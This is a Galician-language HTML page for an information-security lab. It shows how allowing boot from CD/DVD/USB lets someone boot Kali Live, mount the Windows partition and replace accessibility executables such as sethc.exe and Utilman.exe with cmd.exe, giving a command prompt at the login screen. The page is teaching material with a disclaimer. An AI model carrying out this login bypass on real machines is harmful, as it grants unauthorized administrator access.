@@ -1,0 +1,85 @@
+<!DOCTYPE HTML>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <title>Práctica SI Allow Boot dispositivo extraíble: CD/DVD/USB</title>
+  <link rel="stylesheet" type="text/css" href="css/styles.css" />
+</head>
+
+<body>
+  <div id='autocentrado'>
+    <h1 class='arriba'><a href='https://github.com/ricardofc/repoEDU-CCbySA/tree/main/SI/BIOS-Allow-Boot' target='_blank'>Práctica Seguridade Informática<br /> Allow Boot dispositivo extraíble: CD/DVD/USB</a></h1>
+    <img class='cfigure mleft arriba' src="images/mouse-pointer-mini.png" />
+    <figure class='cfigure'>
+      <img class='contido bfigure pall' src="images/Escenario-SI-Allow-Boot-CD-USB-Windows.png" />
+    </figure>
+    <div>
+      <table class='keycombines'>
+        <tbody>
+          <tr><th>Executable<br />C:\Windows\System32</th><th>Atallos de teclado</th><th>Descrición</th></tr>
+          <tr><td>sethc.exe</td><td>Premer 5 veces a tecla Shift (Maiúsculas): &lt;&#8679;&gt;<td>Teclas especiais (Accesibilidade)</td></tr>
+          <tr><td>Magnify.exe</td><td>Premer a mesmo tempo a tecla Windows e a tecla símbolo suma: &lt;Windows&gt;+&lt;+&gt;</td><td>Lupa</td></tr>
+          <tr><td>Narrator.exe</td><td>Premer ao mesmo tempo as 3 teclas:<br /> &lt;Windows&gt;+&lt;Ctrl&gt;+&lt;Enter&gt;</td><td>Axuda narrador lendo en voz alta</td></tr>
+          <tr><td>osk.exe</td><td>Premer ao mesmo tempo as 3 teclas:<br /> &lt;Windows&gt;+&lt;Ctrl&gt;+&lt;o&gt;</td><td>Teclado en pantalla</td></tr>
+          <tr><td>Utilman.exe</td><td>Premer ao mesmo tempo as teclas: &lt;Windows&gt;+&lt;u&gt;</td><td>Utilidades</td></tr>
+        </tbody>
+        <caption class='label'>
+          Táboa. Combinación de teclas
+        </caption>
+     </table>
+    </div>
+    
+    <div class='pagebreak'>&nbsp;</div>
+
+    <div class='nota w80 fright'>
+      <p class='justify pall'><b>LIMITACIÓN DE RESPONSABILIDADE</b> O autor do presente documento declina calquera responsabilidade asociada ao uso incorrecto e/ou malicioso que puidese realizarse coa información exposta no mesmo. Por tanto, non se fai responsable en ningún caso, nin pode ser considerado legalmente responsable en ningún caso, das consecuencias que poidan derivarse da información contida nel ou que esté enlazada dende ou hacia el, incluíndo os posibles erros e información incorrecta existentes, información difamatoria, así como das consecuencias que se poidan derivar sobre a súa aplicación en sistemas de información reais e/ou virtuais. Este documento foi xerado para uso didáctico e debe ser empregado en contornas privadas e virtuais controladas co permiso correspondente do administrador desas contornas.</p>
+      <p class='pall arriba'><b>NOTAS</b>:
+        <ul type='square'>
+          <li class='colorblue'><span class='label'> Instalación por defecto</span>: A instalación do sistema operativo Microsoft Windows realizouse por defecto, é dicir, seguindo os pasos do instalador,</li>
+          <li class='colorblue'><span class='label'> Apagado normal do sistema operativo</span>: Para un correcto funcionamento da práctica o sistema operativo Microsoft Windows debe ser apagado sen inconsistencias evitando problemas no sistema de ficheiros NTFS.</span></li>
+          <li class='colorblue arribam'><span class='label'> <a href='https://support.microsoft.com/es-es/help/12445/windows-keyboard-shortcuts'>URL - Métodos abreviados de teclado de Windows</a></span></li>
+          <img class='cfigure mleft arriba' src="images/mouse-pointer-mini.png" />
+          </li>
+        </ul>
+      </p>
+    </div>
+
+    <div class='contido'>
+      <ol>
+        <div><span class='label'>Práctica</span>
+        <div class='minindent'>&nbsp;</div>
+        <p class='mtop mleft mbottom label'>Arrancar coa Kali Live amd64</p>
+        <li class='mtop mleft mbottom'>Na contorna gráfica abrir un terminal e executar: 
+          <ul class='dashed mleftsubs'><br />
+            <li>setxkbmap es <span class='explicacion'> #Cambiar o mapa de teclado ao idioma español</span>.</li>
+            <li>sudo su - <span class='explicacion'> #Acceder á consola de root(administrador) a través dos permisos configurados co comando sudo (/etc/sudoers, visudo)</li>
+              <ul class='hashtag'>
+                <li>fdisk -l /dev/sda <span class='explicacion'> #Lista a táboa de particións do disco /dev/sda e logo remata.</span></li>
+                <li>mount <span class='explicacion'> #Amosar os sistemas de ficheiros montados, é dicir, os que está a usar e podemos empregar neste sistema operativo live Kali.</li>
+                <li>mount -t auto /dev/sda2 /mnt <span class='explicacion'> #Montar a partición 2 do disco duro /dev/sda no directorio da live /mnt. Coa opción -t auto solicitamos ao comando mount a autodetección do sistema de ficheiros de montaxe. Poderiamos tamén empregar o comando <b>ntfs-3g /dev/sda2 /mnt </b>, o cal xa traballa directamente co sistema de ficheiros NTFS.</span>.</li>
+                <li>mount <span class='explicacion'> #Amosar os sistemas de ficheiros montados, é dicir, os que está a usar e podemos empregar neste sistema operativo live Kali. Neste caso verificamos que a última liña refírese ao punto de montaxe /mnt onde podemos traballar coa partición /dev/sda2.</li>
+                <li>cd /mnt/Windows/System32 <span class='explicacion'> #Acceder ao directorio do sistemas operativo Microsoft Windows C:\Windows\System32, o cal está montado en /mnt/Windows/System32</li>
+                <li>for i in sethc.exe Magnify.exe Narrator.exe osk.exe Utilman.exe; do mv $i old.$i; done <span class='explicacion'> #Mover os executables <b>sethc.exe</b>, <b>Magnify.exe</b>, <b>Narrator</b>, <b>osk.exe</b> e <b>Utilman.exe</b> a <b>old.sethc.exe</b>, <b>old.Magnify.exe</b>, <b>old.Narrator</b>, <b>old.osk.exe</b> e <b>old.Utilman.exe</b> respectivamente</li>
+                <li>for i in sethc.exe Magnify.exe Narrator.exe osk.exe Utilman.exe; do cp -pv cmd.exe $i; done <span class='explicacion'> #Copiar o executable <b>cmd.exe</b> en <b>sethc.exe</b>, <b>Magnify.exe</b>, <b>Narrator</b>, <b>osk.exe</b> e <b>Utilman.exe</b> en modo verbose (detallado) e preservando permisos e datas.</li>
+              <li>cd <span class='explicacion'> #Acceder ao directorio de traballo do usuario, neste caso, acceder a /root</li>
+              <li>umount /mnt<span style='font-size:14px;color:#0F18A0;'> #Desmontar (deixar de facer uso) a partición primaria /dev/sda2 que estaba montada en /mnt</span></li>
+              <li>init 0 <span class='explicacion'> #Apagar a máquina enviando o sinal de apagado mediante o runlevel 0</span></li>
+              </ul>
+          </ul>
+
+        <div class='indent'>&nbsp;</div>
+
+        <p class='mtop mleft mbottom label'>Arrancar a máquina Windows sen o dispositivo extraíble conectado</p>
+        <li class='mtop mleft mbottom'>Antes de iniciar sesión con calquera usuario probar o exposto na <span class='label'>Táboa. Combinación de teclas</span>.  
+        <li class='mtop mleft mbottom'>Acceder con calquera usuario e probar o exposto na <span class='label'>Táboa. Combinación de teclas</span>.  
+      </ol>
+    </div>
+  </div>
+  <hr />
+  <div id="footer">
+    <div class="nome">Ricardo Feijoo Costa</div>
+    <div class='.imgccbysa arriba'>
+      <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" src="images/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
+    </div>
+  </div>
+</body>
+</html>
